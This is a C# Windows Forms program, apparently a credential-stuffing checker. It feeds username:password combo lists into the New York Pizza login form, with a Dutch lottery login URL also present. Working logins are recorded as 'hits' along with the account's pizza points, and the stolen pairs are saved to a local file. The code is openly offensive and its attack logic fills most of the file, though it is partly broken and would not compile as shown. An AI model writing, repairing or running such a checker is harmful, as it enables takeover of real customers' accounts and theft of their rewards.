using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace loterij_money_maker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public string LoginUrl = "https://www.nederlandseloterij.nl/inloggen?utm_source=stl-wv-20170508-lnc-10mei2017-def&utm_medium=nlc&utm_campaign=stl-lnc&utm_content=textlink";
        public string[] pizzapunten1;
        public static int lineCount;
        public static List<string> combolist = new List<string>();
        public int tested;
        public int hitsShow;
        public int hits;
        public int lengteLijst;
        public string lengteLijst2;
        public int[] progresint;
        public string[] IS;
        public string pizzapunten;
        //public string[] progres = System.IO.File.ReadAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\ver.txt");
        //public string[] username = System.IO.File.ReadAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\combo.txt");
        //public string[] password = System.IO.File.ReadAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\pass.txt");
        public int I = 0;
        public int I2 = 1;
        public string pizzaURL = "https://www.newyorkpizza.nl/inloggen";
        public string pizzapuntjes;
        public string test;

        public class AutoClosingMessageBox
        {
            System.Threading.Timer _timeoutTimer;
            string _caption;
            AutoClosingMessageBox(string text, string caption, int timeout)
            {
                _caption = caption;
                _timeoutTimer = new System.Threading.Timer(OnTimerElapsed,
                    null, timeout, System.Threading.Timeout.Infinite);
                MessageBox.Show(text, caption);
            }

            public static void Show(string text, string caption, int timeout)
            {
                new AutoClosingMessageBox(text, caption, timeout);
            }

            void OnTimerElapsed(object state)
            {
                IntPtr mbWnd = FindWindow(null, _caption);
                if (mbWnd != IntPtr.Zero)
                    SendMessage(mbWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                _timeoutTimer.Dispose();
            }
            const int WM_CLOSE = 0x0010;
            [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
            [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
            static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
        }

        private void Btnstart_Click(object sender, EventArgs e)
        {
            webBrowser1.Navigate(LoginUrl);

            AutoClosingMessageBox.Show("njjn","iojioj", 500);
            webBrowser1.Navigate("");
            webBrowser1.Document.GetElementById("");


            lengteLijst = Convert.ToInt32(lengteLijst2);
            label6.Text = lengteLijst2;
            //foreach (string combo in combolist)
            //{
            while (I < lengteLijst && I2 < lengteLijst)
            {
                //string[] tmp = combo.Split(':');
                //AutoClosingMessageBox.Show("wait", "checking", 100);
                //string Username = tmp[0];
                //AutoClosingMessageBox.Show("wait", "checking", 100);
                //string Password = tmp[1];
                //AutoClosingMessageBox.Show("wait", "checking", 100);
                webBrowser1.Navigate(pizzaURL);
                
                AutoClosingMessageBox.Show("wait", "hacking into the system", 1200);


                if (webBrowser1.Document.GetElementById("UserName") != null && webBrowser1.Document.GetElementById("Password") != null && username[I] != null && password[I] != null)
                {
                    try
                    {
                        webBrowser1.Document.GetElementById("UserName").SetAttribute("value", username[I]);
                        webBrowser1.Document.GetElementById("Password").SetAttribute("value", password[I]);
                    }
                    catch (Exception)
                    {
                    }
                }
                else
                {
                    continue;
                }
                HtmlElementCollection elc = this.webBrowser1.Document.GetElementsByTagName("input");
                foreach (HtmlElement el in elc)
                {
                    if (el.GetAttribute("type").Equals("submit"))
                    {
                        el.InvokeMember("Click");
                    }
                }
                AutoClosingMessageBox.Show("filling pass", "crackin pizza", 500);
                if (webBrowser2.Document.GetElementById("UserName") != null && webBrowser2.Document.GetElementById("Password") != null && username[I2] != null && password[I2] != null)
                {
                    try
                    {
                        webBrowser2.Document.GetElementById("UserName").SetAttribute("value", username[I2]);
                        webBrowser2.Document.GetElementById("Password").SetAttribute("value", password[I2]);
                    }
                    catch (NullReferenceException)
                    {

                    }
                }
                HtmlElementCollection elc2 = this.webBrowser2.Document.GetElementsByTagName("input");
                foreach (HtmlElement el in elc2)
                {
                    if (el.GetAttribute("type").Equals("submit"))
                    {
                        el.InvokeMember("Click");
                    }
                }
                //AutoClosingMessageBox.Show("crack", "jonkoe", 500);

                if (webBrowser1.Url.Equals(pizzaURL))
                {
                    AutoClosingMessageBox.Show("wait", "checking", 600);
                }
                //if (webBrowser2.Url.Equals(pizzaURL))
                //{
                //    AutoClosingMessageBox.Show("wait", "checking", 1500);
                //}

                if (webBrowser1.Url.Equals(pizzaURL))
                {
                    webBrowser1.Navigate(pizzaURL);
                }
                if (webBrowser2.Url.Equals(pizzaURL))
                {
                    webBrowser2.Navigate(pizzaURL);
                }
                if (!webBrowser1.Url.Equals("https://www.newyorkpizza.nl/inloggen"))
                {

                    webBrowser1.Navigate("https://www.newyorkpizza.nl/secure/mypoints");
                    AutoClosingMessageBox.Show("capturing points", "checking", 1000);
                    System.Windows.Forms.HtmlDocument document1 = this.webBrowser1.Document;
                    //foreach (XmlNode td in document1.DocumentElement.SelectNodes("//td[@class='container']")
                    //{
                    //    string text = td.InnerText;
                    //    // do whatever with text
                    //}
                    document1.Body.AppendChild
                    var links = webBrowser1.Document.GetElementsByTagName("h2");
                    foreach (HtmlElement link in links)
                    {

                        if (link.GetAttribute("class") == "h1")
                        {
                            string result = link.InnerHtml;
                            MessageBox.Show(result);
                        }
                    }
                    //test = document1.All["name"].ToString();
                    MessageBox.Show("frg");
                    //if (document != null && pizzapuntjes != null)
                    //{
                    //    pizzapuntjes = document.All["h2 class=h1 nyp - text - color - header nyp - text - pizzapoints - header"].GetAttribute("value");
                    //}
                    hitsShow++;
                    label1.Text = Convert.ToString(hitsShow);
                    listBox1.Items.Add($"{username[I]}:{password[I]}");
                    listBox1.Items.Add(pizzapuntjes);
                    label1.Text = Convert.ToString(hitsShow);
                    AutoClosingMessageBox.Show("Succes", "hit", 1000);
                    string[] lines = { username[I] + ":" + password[I] + "//" + pizzapuntjes };
                    System.IO.File.AppendAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\hits.txt", lines);
                    webBrowser1.Navigate("javascript:document.getElementById('logoutForm').submit()");
                    AutoClosingMessageBox.Show("Logging out", "Caption", 1000);


                    //AutoClosingMessageBox.Show("gyugyu", "shag", 100);
                }
                if (!webBrowser2.Url.Equals("https://www.newyorkpizza.nl/inloggen"))
                {
                    webBrowser2.Navigate("https://www.newyorkpizza.nl/secure/mypoints");
                    AutoClosingMessageBox.Show("capturing points", "checking", 600);
                    System.Windows.Forms.HtmlDocument document = this.webBrowser2.Document;

                    if (document != null)
                    {
                        pizzapuntjes = document.All["class"].GetAttribute("value");
                    }
                    hitsShow++;
                    label1.Text = Convert.ToString(hitsShow);
                    listBox1.Items.Add($"{username[I2]}:{password[I2]}");
                    listBox1.Items.Add(pizzapuntjes);
                    label1.Text = Convert.ToString(hitsShow);
                    AutoClosingMessageBox.Show("Succes", "hit", 1000);
                    string[] lines = { username[I2] + ":" + password[I2] + "//" + pizzapuntjes };
                    System.IO.File.AppendAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\hits.txt", lines);
                    webBrowser2.Navigate("javascript:document.getElementById('logoutForm').submit()");
                    AutoClosingMessageBox.Show("Logging out", "Caption", 1000);


                    AutoClosingMessageBox.Show("gyugyu", "shag", 100);
                }

                I = I + 2;
                I2 = I2 + 2;

                tested++;
                tested++;
                label3.Text = Convert.ToString(tested);
                AutoClosingMessageBox.Show("gyugyu", "shag", 100);
                //IS[0] = Convert.ToString(I);
                //IS[1] = Convert.ToString(I2);
                //File.WriteAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\ver.txt", IS); 

            }

        }
    }
}
